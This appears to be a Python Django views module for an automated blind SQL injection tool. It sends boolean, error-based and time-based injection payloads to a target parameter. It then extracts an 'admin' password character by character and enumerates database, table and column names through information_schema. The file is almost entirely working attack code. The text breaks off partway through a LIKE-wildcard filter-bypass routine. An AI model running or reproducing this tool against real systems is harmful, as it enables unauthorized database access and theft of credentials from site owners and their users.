import json
from typing import List

from urllib import parse
import requests
from bs4 import BeautifulSoup
from .models import list
from ast import literal_eval
from django.shortcuts import render
from django.contrib import messages
from .utils import findUserKeyword, sendQuery,sendQuery2


def checkAttackAble(dicQuery):
    attack_querys = '\n'
    start = {}

    attack = dicQuery['name'].split(',')

    for name in attack:
        for i in range(1, 3):
            res = sendQuery(dicQuery, {
                name:  f"'	&&	1={i}--	" })
            result = findUserKeyword(res, dicQuery['find'])

            if result[0] == 1:
                attack_querys += result[1] + '\n'
                start[name] = str(dicQuery['parameter']) + "'"
                print(1, attack_querys, start)
                return 2, attack_querys, start

            else:
                res = sendQuery(dicQuery, {
                    name: f"'	||	1={i}--	"})
                result = findUserKeyword(res, dicQuery['find'])
                print(result)

                if result[0] == 1:
                    attack_querys += result[1] + '\n'
                    start[name] = str(dicQuery['parameter']) + "'"
                    print(2, attack_querys, start)
                    return 2, attack_querys, start
                else :
                    res = sendQuery(dicQuery, {
                        name: dicQuery['parameter'] + f"'	||	1	in	(1)--	"})
                    result = findUserKeyword(res, dicQuery['find'])
                    if result[0] == 1:
                        attack_querys += result[1] + '\n'
                        start[name] = str(dicQuery['parameter']) + "'"
                        return 2, attack_querys, start


        for i in range(1, 3):
            res = sendQuery(dicQuery, {
                name: dicQuery['parameter'] + f'"	&&	1={i}--	' })
            result = findUserKeyword(res, dicQuery['find'])

            if result[0] == 1:
                attack_querys += result[1] + '\n'
                start[name] = str(dicQuery['parameter']) + '"'
                print(3, attack_querys, start)
                return 1, attack_querys, start
            else:
                res = sendQuery(dicQuery, {
                    name: dicQuery['parameter'] + f'"	||	1={i}--	' })
                result = findUserKeyword(res, dicQuery['find'])

                if result[0] == 1:
                    attack_querys += result[1] + '\n'
                    flag = 1
                    start[name] = str(dicQuery['parameter']) + '"'
                    print(4, attack_querys, start)
                    return 1, attack_querys, start
                else:
                    res = sendQuery(dicQuery, {
                        name: dicQuery['parameter'] + f'"	||	1	in	(1)--	'})
                    result = findUserKeyword(res, dicQuery['find'])
                    if result[0] == 1:
                        attack_querys += result[1] + '\n'
                        start[name] = str(dicQuery['parameter']) + '"'
                        return 1, attack_querys, start

        for i in range(1, 3):
            res = sendQuery(dicQuery, {
                name: dicQuery['parameter'] + f'	&&	1={i}--	'})
            result = findUserKeyword(res, dicQuery['find'])

            if result[0] == 1:
                attack_querys += result[1] + '\n'
                start[name] = str(dicQuery['parameter'])
                print(5, attack_querys, start)
                return 3, attack_querys, start

            else:
                res = sendQuery(dicQuery, {
                    name: dicQuery['parameter'] + f'	||	1={i}--	'})
                result = findUserKeyword(res, dicQuery['find'])
                if result[0] == 1:
                    attack_querys += result[1] + '\n'
                    start[name] = str(dicQuery['parameter'])
                    print(5, attack_querys, start)
                    return 3, attack_querys, start

                else :
                    res = sendQuery(dicQuery, {
                        name: dicQuery['parameter'] + f'-999	||	1={i}--	'})
                    result = findUserKeyword(res, dicQuery['find'])
                    if result[0] == 1:
                        attack_querys += result[1] + '\n'
                        start[name] = str(dicQuery['parameter'])+'-9999'
                        return 3, attack_querys, start



                    res = sendQuery(dicQuery, {
                        name: dicQuery['parameter'] + f"-999	||	1	in	(1)--	"})
                    result = findUserKeyword(res, dicQuery['find'])
                    if result[0] == 1:
                        attack_querys += result[1] + '\n'
                        start[name] = str(dicQuery['parameter'])+'-9999'
                        return 3, attack_querys, start

        res = sendQuery(dicQuery, {
            name: dicQuery['parameter'] + f'"	||	if(0,1,(select	1	union	select	2))#'})
        bs = BeautifulSoup(res.text, 'html.parser')
        if 'Subquery' in bs.get_text():
            attack_querys += res.url +'\n'
            res = sendQuery(dicQuery, {
                name: dicQuery['parameter'] + f'"	||	if(1,1,(select	1	union	select	2))#'})
            bs = BeautifulSoup(res.text, 'html.parser')
            if not 'Subquery' in bs.get_text():
                attack_querys += res.url + '\n'
                start[name] = str(dicQuery['parameter']) + '"'
                return 4, attack_querys, start

        res = sendQuery(dicQuery, {
            name: dicQuery['parameter'] + f"'	||	if(0,1,(select	1	union	select	2))#"})
        bs = BeautifulSoup(res.text, 'html.parser')
        if 'Subquery' in bs.get_text():
            print(bs.get_text())
            attack_querys += res.url + '\n'
            res = sendQuery(dicQuery, {
                name: dicQuery['parameter'] + f"'	||	if(1,1,(select	1	union	select	2))#"})
            bs = BeautifulSoup(res.text, 'html.parser')
            if not 'Subquery' in bs.get_text():
                attack_querys += res.url + '\n'
                start[name] = str(dicQuery['parameter']) + "'"
                return 5, attack_querys, start

        res = sendQuery(dicQuery, {
            name: dicQuery['parameter'] + f"	||	if(0,1,(select	1	union	select	2))#"})
        bs = BeautifulSoup(res.text, 'html.parser')
        if 'Subquery' in bs.get_text():
            attack_querys += res.url + '\n'
            res = sendQuery(dicQuery, {
                name: dicQuery['parameter'] + f"	||	if(1,1,(select	1	union	select	2))#"})
            bs = BeautifulSoup(res.text, 'html.parser')
            if not 'Subquery' in bs.get_text():
                attack_querys += res.url + '\n'
                start[name] = str(dicQuery['parameter']) + "'"
                return 6, attack_querys, start




        res = sendQuery(dicQuery, {
            name: dicQuery['parameter'] + f'"	&&	if(0,1,(select	1	union	select	2))#'})
        bs = BeautifulSoup(res.text, 'html.parser')
        if 'Subquery' in bs.get_text():
            attack_querys += res.url + '\n'
            res = sendQuery(dicQuery, {
                name: dicQuery['parameter'] + f'"	&&	if(1,1,(select	1	union	select	2))#'})
            bs = BeautifulSoup(res.text, 'html.parser')
            if not 'Subquery' in bs.get_text():
                attack_querys += res.url + '\n'
                start[name] = str(dicQuery['parameter']) + '"'
                return 4, attack_querys, start

        res = sendQuery(dicQuery, {
            name: dicQuery['parameter'] + f"'	&&	if(0,1,(select	1	union	select	2))#"})
        bs = BeautifulSoup(res.text, 'html.parser')
        if 'Subquery' in bs.get_text():
            attack_querys += res.url + '\n'
            res = sendQuery(dicQuery, {
                name: dicQuery['parameter'] + f"'	&&	if(1,1,(select	1	union	select	2))#"})
            bs = BeautifulSoup(res.text, 'html.parser')
            if not 'Subquery' in bs.get_text():
                attack_querys += res.url + '\n'
                start[name] = str(dicQuery['parameter']) + "'"
                return 5, attack_querys, start

        res = sendQuery(dicQuery, {
            name: dicQuery['parameter'] + f"'	&&	if(0,1,(select	1	union	select	2))#"})
        bs = BeautifulSoup(res.text, 'html.parser')
        if 'Subquery' in bs.get_text():
            attack_querys += res.url + '\n'
            res = sendQuery(dicQuery, {
                name: dicQuery['parameter'] + f"	&&	if(1,1,(select	1	union	select	2))#"})
            bs = BeautifulSoup(res.text, 'html.parser')
            if not 'Subquery' in bs.get_text():
                attack_querys += res.url + '\n'
                start[name] = str(dicQuery['parameter']) + "'"
                return 6, attack_querys, start




        res = sendQuery2(dicQuery, {
            name: dicQuery['parameter'] + f'"	||	1=1	&&	sleep(10)--	'})
        if res == 1 :
            start[name] = str(dicQuery['parameter']) + '"'
            return 1, attack_querys, start
        res = sendQuery2(dicQuery, {
            name: dicQuery['parameter'] + f"'	||	1=1	&&	sleep(10)--	"})
        if res == 1:
            start[name] = str(dicQuery['parameter']) + "'"
            return 2, attack_querys, start
        res = sendQuery2(dicQuery, {
            name: dicQuery['parameter'] + f"	||	1=1	&&	sleep(10)--	"})
        if res == 1:
            start[name] = str(dicQuery['parameter']) + "'"
            return 3, attack_querys, start

        res = sendQuery2(dicQuery, {
            name: dicQuery['parameter'] + f'"	&&	1=1	&&	sleep(10)--	'})
        if res == 1:
            start[name] = str(dicQuery['parameter']) + '"'
            return 1, attack_querys, start
        res = sendQuery2(dicQuery, {
            name: dicQuery['parameter'] + f"'	&&	1=1	&&	sleep(10)--	"})
        if res == 1:
            start[name] = str(dicQuery['parameter']) + "'"
            return 2, attack_querys, start
        res = sendQuery2(dicQuery, {
            name: dicQuery['parameter'] + f"	&&	1=1	&&	sleep(10)--	"})
        if res == 1:
            start[name] = str(dicQuery['parameter']) + "'"
            return 3, attack_querys, start

    return -1, '', ''


def exploit2 (dicQuery, query):
    attack_querys =''
    res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + str(query)})
    result = findUserKeyword(res,dicQuery['find'])

    attack_querys += result[1]

    return result[0],attack_querys


def retry(request):
    flag = 0
    if(request.method == "POST"):
        query = (request.POST.get("requery"))
        dicQuery = request.POST.get("origin")
        python_dict = literal_eval(dicQuery)
        check_union ={'union', 'select'}

        for i in check_union:
            if i in query :
                flag = 1
                obj, is_created = list.objects.get_or_create(query=query,stand='union')
                break

        if flag == 0:
            obj, is_created = list.objects.get_or_create(query=query,stand='query')


        a,testtest = exploit2(python_dict, obj)
        if(a == 1) :
            return render(request,'injection/result.html', {'ttt':testtest,'s':'1'})
        else :
            return render(request, 'injection/result.html', {'ttt': testtest, 'f': '1'})


def brute(start,dicQuery,attack_querys,know):
    length = 0
    getvalue = []
    n = int(dicQuery['range'])
    for i in range(1, n):
        res = sendQuery(dicQuery, {
            dicQuery['name']: str(start[dicQuery['name']]) + f"	||	id='admin'	&&	length(" + know + f")={i}--	"})
        result = findUserKeyword(res, dicQuery['find'])
        print(result)
        if result[0] == 1:
            attack_querys += result[1] + '\n'
            length = i
            break
    if length != 0:
        for i in range(1, length + 1):
            for j in range(1, 9):
                res = sendQuery(dicQuery, {
                    dicQuery['name']: str(start[dicQuery['name']]) + "	||	id='admin'	&& length(substr(" + know + f",{i},1))={j}--	"})
                result = findUserKeyword(res, dicQuery['find'])
                print(result)
                if result[0] == 1:
                    attack_querys += result[1] + '\n'
                    getvalue.append(j)
                    break

        pw_result = ''
        a = []
        print('length', length)
        print(getvalue)

        for j in range(1, len(getvalue) + 1):
            print(j,len(getvalue))
            pw = ''
            sum = 0
            bit = 8 * getvalue[j - 1]
            for i in range(1, bit + 1):
                res = sendQuery(dicQuery, {
                    dicQuery['name']:  str(start[dicQuery['name']]) + "	||	id='admin'	&&	substr(lpad(bin(ord(substr(" + know + f",{j},1))),{bit},0),{i},1)=1--	"})
                result = findUserKeyword(res, dicQuery['find'])
                attack_querys += result[1] + '\n'
                try:
                    if result[0] == 1:
                        pw += '1'
                        sum += 1
                    else:
                        pw += '0'
                        sum += 0
                except:
                    import traceback
                    print(traceback.format_exc())

                print(pw)
            a.append(pw)
            pw_result += chr(int(pw, 2))
            print("pw: %s" % (pw_result))

        if sum == 0:
            return '', attack_querys, length


        return pw_result,attack_querys,length
    else :
        db_query = list.objects.filter(stand='query')
        for i in db_query :
            res = sendQuery(dicQuery, {
                dicQuery['name']: str(start[dicQuery['name']]) + str(i)})
            result = findUserKeyword(res, dicQuery['find'])

            if result[0] == 1:
                attack_querys += result[1] + '\n'
                return i, attack_querys,length

        return '', attack_querys,length

def brute2(start,dicQuery,attack_querys,pw_len,know):
    pw =''
    if pw_len == 0 :
        n = int(dicQuery['range'])
        for i in range(n + 1):
            res = sendQuery(dicQuery, {
                dicQuery['name']: str(start[dicQuery['name']]) + f"	||	id	in	('admin')	&&	length(" + know + f")>{i}--	"})
            result = findUserKeyword(res, dicQuery['find'])
            print(result)
            if result[0] == 0:
                st = "'"
                attack_querys += result[1] + '\n'
                length = i
                pw_len = i
                break



    if pw_len == 0 :
        n = int(dicQuery['range'])
        for i in range(n + 1):
            res = sendQuery(dicQuery, {
                dicQuery['name']: str(start[dicQuery['name']]) + f'	||	id	in	("admin")	&&	length(' + know + f')>{i}--	'})
            result = findUserKeyword(res, dicQuery['find'])
            print(result)
            if result[0] == 0:
                st = '"'
                attack_querys += result[1] + '\n'
                length = i
                pw_len = i
                break


    getvalue = []
    for i in range(1,pw_len+1):
        res = sendQuery(dicQuery, {
            dicQuery['name']: str(start[dicQuery['name']]) + f"	||	id=" + st + 'admin' + st + f"	&&	ascii(mid(" + know + f",{i},1))<50--	"})
        result = findUserKeyword(res, dicQuery['find'])
        print(result)
        if result[0] == 1:
            for j in range(20, 50):
                res = sendQuery(dicQuery, {
                    dicQuery['name']: str(start[dicQuery['name']]) + f"	||	id=" + st + 'admin' + st + f"	&&	ascii(mid(" + know + f",{i},1))={j}--	"})
                result = findUserKeyword(res, dicQuery['find'])
                print(result)
                if result[0] == 1:
                    attack_querys += result[1] + '\n'
                    pw += chr(j)
                    print(pw)
                    break
        else :
            res = sendQuery(dicQuery, {
                dicQuery['name']: str(start[dicQuery['name']]) + f"	||	id=" + st + 'admin' + st + f"	&&	ascii(mid(" + know + f",{i},1))<100--	"})
            result = findUserKeyword(res, dicQuery['find'])
            print(result)
            if result[0] == 1:
                for j in range(50, 100):
                    res = sendQuery(dicQuery, {
                        dicQuery['name']: str(start[dicQuery['name']]) + f"	||	id=" + st + 'admin' + st + f"	&&	ascii(mid(" + know + f",{i},1))={j}--	"})
                    result = findUserKeyword(res, dicQuery['find'])
                    print(result)
                    if result[0] == 1:
                        attack_querys += result[1] + '\n'
                        pw += chr(j)
                        print(pw)
                        break
            else :

                for j in range(100,150):
                    res = sendQuery(dicQuery, {
                        dicQuery['name']: str(start[dicQuery['name']]) + f"	||	id=" + st + 'admin' + st + f"	&&	ascii(mid("+ know + f",{i},1))={j}--	"})
                    result = findUserKeyword(res, dicQuery['find'])
                    print(result)
                    if result[0] == 1:
                        attack_querys += result[1] + '\n'
                        pw += chr(j)
                        print(pw)
                        break
        if pw =='':
            break
    print(pw,'최종pw값')

    if pw == '' :
        for i in range(1, pw_len + 1):
            res = sendQuery(dicQuery, {
                dicQuery['name']: str(start[dicQuery['name']]) + f"	||	id	in	(" + st + 'admin' + st + f")	&&	ascii(mid(" + know + f",{i},1))<50--	"})
            result = findUserKeyword(res, dicQuery['find'])
            print(result)
            if result[0] == 1:
                for j in range(20, 50):
                    res = sendQuery(dicQuery, {
                        dicQuery['name']: str(start[dicQuery['name']])+ f"	||	id	in	(" + st + 'admin' + st + f")	&&	ascii(mid(" + know + f",{i},1))>{j}--	"})
                    result = findUserKeyword(res, dicQuery['find'])
                    print(result)
                    if result[0] == 0:
                        if j == 20:
                            break
                        attack_querys += result[1] + '\n'
                        pw += chr(j)
                        print(pw)
                        break
            else :
                res = sendQuery(dicQuery, {
                    dicQuery['name']: str(start[dicQuery['name']]) + f"	||	id	in	(" + st + 'admin' + st + f")	&&	ascii(mid(" + know + f",{i},1))<100--	"})
                result = findUserKeyword(res, dicQuery['find'])
                print(result)
                if result[0] == 1:
                    for j in range(50, 100):
                        res = sendQuery(dicQuery, {
                            dicQuery['name']: str(start[dicQuery['name']]) + f"	||	id	in	(" + st + 'admin' + st + f")	&&	ascii(mid(" + know + f",{i},1))>{j}--	"})
                        result = findUserKeyword(res, dicQuery['find'])
                        print(result)
                        if result[0] == 0:
                            if j == 50:
                                break
                            attack_querys += result[1] + '\n'
                            pw += chr(j)
                            print(pw)
                            break
                else :
                    for j in range(100, 150):
                        res = sendQuery(dicQuery, {
                            dicQuery['name']: str(start[dicQuery['name']]) + f"	||	id	in	("+ st + 'admin'+ st +f")	&&	ascii(mid("+ know + f",{i},1))>{j}--	"})
                        result = findUserKeyword(res, dicQuery['find'])
                        print(result)
                        if result[0] == 0 :
                            if j == 100:
                                break
                            attack_querys += result[1] + '\n'
                            pw += chr(j)
                            print(pw)
                            break
            if pw == '':
                break


        if pw == '':
            if length != 0:
                for i in range(1, length + 1):
                    for j in range(1, 9):
                        res = sendQuery(dicQuery, {
                            dicQuery['name']: str(start[dicQuery['name']]) + "	||	id	in	("+ st +'admin'+ st + f")	&&	length(mid(" + know + f",{i},1))>{j}--	"})
                        result = findUserKeyword(res, dicQuery['find'])
                        print(result)
                        if result[0] == 0:
                            attack_querys += result[1] + '\n'
                            getvalue.append(j)
                            break

                pw_result = ''
                a = []
                print('length', length)
                print(getvalue)
                sum = 0

                for j in range(1, len(getvalue) + 1):
                    print(j, len(getvalue))
                    pw = ''
                    bit = 8 * getvalue[j - 1]
                    for i in range(1, bit + 1):
                        res = sendQuery(dicQuery, {
                            dicQuery['name']: str(start[dicQuery['name']]) + "	||	id	in	("+ st +'admin'+ st +f")	&&	mid(lpad(bin(ord(mid(" +
                                              know + f",{j},1))),{bit},0),{i},1)>0--	"})
                        result = findUserKeyword(res, dicQuery['find'])
                        attack_querys += result[1] + '\n'
                        try:
                            if result[0] == 1:
                                sum += 1
                                pw += '1'
                            else:
                                pw += '0'
                                sum += 0
                        except:
                            import traceback
                            print(traceback.format_exc())

                        print(pw)
                    a.append(pw)
                    pw_result += chr(int(pw, 2))
                    print("pw: %s" % (pw_result))

                if sum == 0:
                    return '',attack_querys,st, length
                return pw_result, attack_querys, st, length

    return pw,attack_querys,st, length

def error (start,dicQuery,attack_querys,know):
    length = 0
    getvalue = []
    n = int(dicQuery['range'])
    for i in range(1, n):
        res = sendQuery(dicQuery, {
            dicQuery['name']: str(start[dicQuery['name']]) + f"	||	id='admin'	&&	if(length(" + know + f")={i},1,(select	1	union	select	2))--	"})
        bs = BeautifulSoup(res.text, 'html.parser')
        if not 'Subquery' in bs.get_text():
            attack_querys += res.url + '\n'
            length = i
            break

    if length != 0:
        for i in range(1, length + 1):
            for j in range(1, 9):
                res = sendQuery(dicQuery, {
                    dicQuery['name']: str(start[dicQuery['name']]) + "	||	id='admin'	&& if(length(substr(" + know + f",{i},1))={j},1,(select	1	union	select	2))--	"})
                bs = BeautifulSoup(res.text, 'html.parser')
                if not 'Subquery' in bs.get_text():
                    attack_querys += res.url + '\n'
                    getvalue.append(j)
                    break

        pw_result = ''
        a = []
        print('length', length)
        print(getvalue)

        for j in range(1, len(getvalue) + 1):
            print(j,len(getvalue))
            pw = ''
            sum = 0
            bit = 8 * getvalue[j - 1]
            for i in range(1, bit + 1):
                res = sendQuery(dicQuery, {
                    dicQuery['name']:  str(start[dicQuery['name']]) + "	||	id='admin'	&&	if(substr(lpad(bin(ord(substr(" + know + f",{j},1))),{bit},0),{i},1)=1,1,(select	1	union	select	2))--	"})
                bs = BeautifulSoup(res.text, 'html.parser')
                attack_querys += res.url + '\n'
                try:
                    if not 'Subquery' in bs.get_text():
                        pw += '1'
                        sum = 1
                    else:
                        pw += '0'
                        sum = 0
                except:
                    import traceback
                    print(traceback.format_exc())

                print(pw)
            a.append(pw)
            pw_result += chr(int(pw, 2))
            print("pw: %s" % (pw_result))

        if sum == 0:
            return '', attack_querys, length


        return pw_result,attack_querys,length
    else :
        db_query = list.objects.filter(stand='query')
        for i in db_query :
            res = sendQuery(dicQuery, {
                dicQuery['name']: str(start[dicQuery['name']]) + str(i)})
            bs = BeautifulSoup(res.text, 'html.parser')

            if not 'Subquery' in bs.get_text():
                attack_querys += res.url + '\n'
                return i, attack_querys,length

        return '', attack_querys,length



def hex(start,dicQuery,attack_querys,pw_len,know,st):
    pw = ''
    li = ['40', '50', '60', '70','80', '90']
    li2 = []

    def find(n):
        res = sendQuery(dicQuery, {
            dicQuery['name']: str(start[dicQuery['name']]) + f"'||id	in	(" + st + 'admin' + st+f")&&hex(mid({know},{j},1))	>	{n}9"})
        result = findUserKeyword(res, dicQuery['find'])
        #global cnt
        #cnt = cnt + 1
        if result[0] == 1:
            return 0
        return 1

    def num(n):
        res = sendQuery(dicQuery, {
            dicQuery['name']: str(start[dicQuery['name']]) + f"||id	in	("+ st +'admin'+ st + f")&&hex(mid({know},{j},1))	>	{n}4"})
        result = findUserKeyword(res, dicQuery['find'])
        #global cnt
        #cnt = cnt + 1
        if result[0] == 1:
            return 0
        return 1

    def char(n):
        res = sendQuery(dicQuery, {
            dicQuery['name']: str(start[dicQuery['name']]) + f"||id	in	("+ st +'admin'+ st + f")&&hex(mid({know},{j},1))	>	{n}D"})
        result = findUserKeyword(res, dicQuery['find'])
        #global cnt
        #cnt = cnt + 1
        if result[0] == 1:
            return 0
        return 1


    for j in range(1, pw_len + 1):
        flag = 0
        for k in range(10):
            res = sendQuery(dicQuery, {
                dicQuery['name']: str(start[dicQuery['name']]) + f'||id	in	('+ st +'admin'+ st +f')&&hex(mid({know},{j},1))	<	{k}0'})
            result = findUserKeyword(res, dicQuery['find'])
            #cnt = cnt + 1
            if result[0] == 1:
                if (find(k-1)):
                    if (num(k-1)):
                        n = (k - 1)*10
                        for i in range(n, n+5):
                            res = sendQuery(dicQuery, {
                                dicQuery['name']: str(start[dicQuery['name']]) + f'||id	in	('+ st +'admin'+ st +f')&&hex(mid({know},{j},1))	in	({i})'})
                            result = findUserKeyword(res, dicQuery['find'])
                            #cnt = cnt + 1
                            if result[0] == 1:
                                pw = pw + chr(int(f"{i}", 16))
                                print(pw)
                                break

                    else:
                        n = (k - 1) * 10
                        for i in range(n + 5, n + 10):
                            res = sendQuery(dicQuery, {
                                dicQuery['name']: str(start[dicQuery['name']]) + f'||id	in	('+ st +'admin'+ st +f')&&hex(mid({know},{j},1))	in	({i})'})
                            result = findUserKeyword(res, dicQuery['find'])

                            #cnt = cnt + 1
                            if result[0] == 1:
                                pw = pw + chr(int(f"{i}", 16))
                                print(pw)
                                break

                else:
                    for i in 'A,B,C,D,E,F':
                        res = sendQuery(dicQuery, {
                            dicQuery['name']: str(start[dicQuery['name']]) + f'||	id	in	('+ st +'admin'+ st +f')&&hex(mid(pw,{j},1))	in	({k-1}{i})'})
                        result = findUserKeyword(res, dicQuery['find'])
                        #cnt = cnt + 1
                        if result[0] == 1:
                            pw = pw + chr(int(f"{i}", 16))
                            print(pw)
                            break
                break

    print(pw)
    #print(cnt)
    return pw, attack_querys

def db_union(dicQuery,start):
    db_union = list.objects.filter(stand='union')
    db_len = list.objects.filter(stand='length')

    print(db_union)
    for i in db_union:
        print(i)
        res = sendQuery2(dicQuery, {dicQuery['name']: str(start[dicQuery['name']]) + '	' + str(i)+'	&&	sleep(10)--	'})
        if res == 1 :
            print('1')
            cnt = 1
            while True :

                if str(cnt) in str(i):
                    cnt += 1
                else :

                    for k in db_union:
                        find_list_text = []
                        res = sendQuery(dicQuery, {
                            dicQuery['name']: str(start[dicQuery['name']]) + '	'+ str(k)})
                        page = BeautifulSoup(res.text, 'html.parser')


                        print(page)

                        for find_text in page.select('div'):
                            find_list_text.append(find_text.text.replace('\n',''))
                        print('check',find_list_text)

                        '''

                        if len(find_list_text) == 0:
                            for find_text in page.select('h2'):
                                find_list_text.append(find_text.text.replace('\n', ''))
                            print('check', find_list_text)
                        '''

                        for j in range(1, cnt):
                            print('들어왔음요')
                            for tmp in range(len(find_list_text)):
                                print(j,find_list_text[tmp])
                                if str(j) == find_list_text[tmp]:
                                    print('같은 원소 찾음요')
                                    print(j,find_list_text[tmp])
                                    index = tmp
                                    print(index)

                                    result_list_text = []
                                    k_new = str(k).replace(f'{j}','database()')
                                    res = sendQuery(dicQuery, {
                                        dicQuery['name']: start + ' ' + k_new})
                                    page = BeautifulSoup(res.text, 'html.parser')

                                    for find_text in page.select('span'):
                                        result_list_text.append(find_text.text.replace('\n', ''))

                                    print(result_list_text[index])
                                    db_name = result_list_text[index]

                                    result_list_text = []
                                    k_new = str(k).replace(f'{j}', 'table_name')
                                    print(k_new)
                                    k_new = k_new.replace('-- ',f' from information_schema.tables where table_schema="{db_name}"-- ')
                                    print(k_new)

                                    res = sendQuery(dicQuery, {
                                        dicQuery['name']: start + ' ' + k_new})
                                    page = BeautifulSoup(res.text, 'html.parser')

                                    return cnt - 1, db_name


                    for i in range(int(dicQuery['range'])):
                        db_name_len = -1
                        res = sendQuery(dicQuery, {dicQuery['name']: str(start[dicQuery['name']]) + f' and length(database())={i}'})
                        result = findUserKeyword(res, dicQuery['find'])

                        if result[0] == 1:
                            db_name_len = i
                            break

                    print(db_name_len,'check---------')
                    if db_name_len == -1:
                        return cnt - 1,''

                    getvalue = []
                    for i in range(1, db_name_len + 1):
                        for j in range(1, 9):
                            res = sendQuery(dicQuery, {
                                dicQuery['name']: str(start[dicQuery['name']]) + " and length(substr(" + 'database()' + f",{i},1))={j}-- "})
                            result = findUserKeyword(res, dicQuery['find'])
                            print(result)
                            if result[0] == 1:
                                getvalue.append(j)
                                break

                    db_name = ''
                    print('length', db_name_len)
                    print(getvalue)

                    for j in range(1, db_name_len + 1):
                        db = ''
                        bit = 8 * getvalue[j - 1]
                        for i in range(1, bit + 1):
                            res = sendQuery(dicQuery, {
                                dicQuery['name']: str(start[dicQuery['name']]) + " and substr(lpad(bin(ord(substr(" + 'database()' + f",{j},1))),{bit},0),{i},1)=1-- "})
                            result = findUserKeyword(res, dicQuery['find'])
                            try:
                                if result[0] == 1:
                                    db += '1'
                                else:
                                    db += '0'
                            except:
                                import traceback
                                print(traceback.format_exc())

                            print(db)
                        db_name += chr(int(db, 2))
                        print("pw: %s" % (db_name))

                    return cnt - 1,db_name

                    return cnt - 1, ''

    return '',''

def db_union_error(dicQuery,start) :
    db_union = list.objects.filter(stand='union')

    print(db_union)
    for i in db_union:
        print(i)
        res = sendQuery(dicQuery, {
            dicQuery['name']: str(start[dicQuery['name']]) + '||' + 'if(('+str(i) +')1,(select	1	union	select	2))--	'})
        bs = BeautifulSoup(res.text, 'html.parser')
        if not 'Operand' in bs.get_text():
            print('1')
            cnt = 1
            while True:

                if str(cnt) in str(i):
                    cnt += 1
                else:
                    return cnt -1

def table_name(dicQuery,start,db_name):
    table_name = []
    n = int(dicQuery['range'])
    table_name_length = []
    attack_querys = '\n'
    string = str(start[dicQuery['name']]) + ' and length((select table_name from information_schema.tables where table_schema='
    for i in range(n):
        flag = 0
        for j in range(1, n + 1) :
            res = sendQuery(dicQuery, {dicQuery['name']: string + f"'{db_name}'limit {i},1))>={j}-- "})
            print(res.url)
            print(res.status_code)

            result = findUserKeyword(res, dicQuery['find'])
            #print(res.url)

            if result[0] != 1:
                flag = 1
                if j == 1:
                    flag = 2
                    break
                attack_querys += result[1] + '\n'
                table_name_length.append(int(j - 1))
                print('중간점검', table_name_length)
                break
        if flag == 2 :
            break

    print('최종',table_name_length)

    getvalue = []
    print(len(table_name_length))
    n = len(table_name_length)
    if len == 0:
        return ''
    for i in range(n):
        tmp = []
        for length in range(1, table_name_length[i] + 1):

            for j in range(1, 9):
                res = sendQuery(dicQuery, {dicQuery['name']: str(start[dicQuery['name']]) + f" and length(substr((select table_name from information_schema.tables where table_schema='{db_name}' limit {i},1),{length},1))={j}-- "})
                result = findUserKeyword(res, dicQuery['find'])
                print(result)
                if result[0] == 1:
                    attack_querys += result[1] + '\n'
                    tmp.append(j)
                    print('tmp',tmp)
                    break
        getvalue.append(tmp)
    print(getvalue)

    for i in range(n):
        table = ''
        for j in range(1, table_name_length[i] + 1):
            pw = ''
            bit = 8 * getvalue[i][j - 1]
            for k in range(1, bit + 1):
                res = sendQuery(dicQuery, {dicQuery['name']: str(start[dicQuery['name']]) + f" and substr(lpad(bin(ord(substr((SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' limit {i},1)" + f",{j},1))),{bit},0),{k},1)=1-- "})
                result = findUserKeyword(res, dicQuery['find'])
                attack_querys += result[1] + '\n'
                try:
                    if result[0] == 1:
                        pw += '1'
                    else:
                        pw += '0'
                except:
                    import traceback
                    print(traceback.format_exc())

                print(pw)
            table += chr(int(pw, 2))
            print("pw: %s" % (table))
        table_name.append(table)

    print(table_name)
    return table_name


def column_name(dicQuery,start,table_name):
    column_name_result = {}
    for tb_name in table_name :
        column_name = []
        n = int(dicQuery['range'])
        column_name_length = []
        attack_querys = '\n'
        string = str(start[dicQuery['name']]) + ' and length((select column_name from information_schema.columns where table_name='
        for i in range(n):
            flag = 0
            for j in range(1, n + 1) :
                res = sendQuery(dicQuery, {dicQuery['name']: string + f"'{tb_name}'limit {i},1))>={j}-- "})
                print(res.url)
                #print(res.status_code)

                result = findUserKeyword(res, dicQuery['find'])
                #print(res.url)

                if result[0] != 1:
                    flag = 1
                    if j == 1:
                        flag = 2
                        break
                    attack_querys += result[1] + '\n'
                    column_name_length.append(int(j - 1))
                    print('중간점검', column_name_length)
                    break
            if flag == 2 :
                break

        print('최종',column_name_length)

        getvalue = []
        print(len(column_name_length))
        n = len(column_name_length)
        if n == 0:
            return ''
        for i in range(n):
            tmp = []
            for length in range(1, column_name_length[i] + 1):

                for j in range(1, 9):
                    res = sendQuery(dicQuery, {dicQuery['name']: str(start[dicQuery['name']]) + f" and length(substr((select column_name from information_schema.columns where table_name='{tb_name}' limit {i},1),{length},1))={j}-- "})
                    result = findUserKeyword(res, dicQuery['find'])
                    print(result)
                    if result[0] == 1:
                        attack_querys += result[1] + '\n'
                        tmp.append(j)
                        print('tmp',tmp)
                        break
            getvalue.append(tmp)
        print(getvalue)

        for i in range(n):
            column = ''
            for j in range(1, column_name_length[i] + 1):
                pw = ''
                bit = 8 * getvalue[i][j - 1]
                for k in range(1, bit + 1):
                    res = sendQuery(dicQuery, {dicQuery['name']: str(start[dicQuery['name']]) + f" and substr(lpad(bin(ord(substr((SELECT column_name FROM information_schema.columns WHERE table_name='{tb_name}' limit {i},1)" + f",{j},1))),{bit},0),{k},1)=1-- "})
                    result = findUserKeyword(res, dicQuery['find'])
                    attack_querys += result[1] + '\n'
                    try:
                        if result[0] == 1:
                            pw += '1'
                        else:
                            pw += '0'
                    except:
                        import traceback
                        print(traceback.format_exc())

                    print(pw)
                column += chr(int(pw, 2))
                print("pw: %s" % (column))
            column_name.append(column)

        #print(column_name)

        column_name_result[tb_name] = column_name

    print(column_name_result)


    return column_name_result



def filter(dicQuery):
    attack_querys = ''
    length ='_'
    len_value = 0
    for i in range(1,int(dicQuery['range'])+1):
        res = sendQuery(dicQuery, {dicQuery['name']: length })
        print(res.url)
        # print(res.status_code)
        result = findUserKeyword(res, dicQuery['find'])

        if result[0] == 0:
            length+='_'

        else :
            len_value = i
            attack_querys += result[1] + '\n'
            print('length',len_value)
            break
    value = ''
    if len_value != 0:
        for i in range(20,int(dicQuery['range'])+100):
            if i == 37:
                continue
            res = sendQuery(dicQuery, {dicQuery['name']: chr(i)+'%'})
            result = findUserKeyword(res, dicQuery['find'])
            if result[0] == 1 :
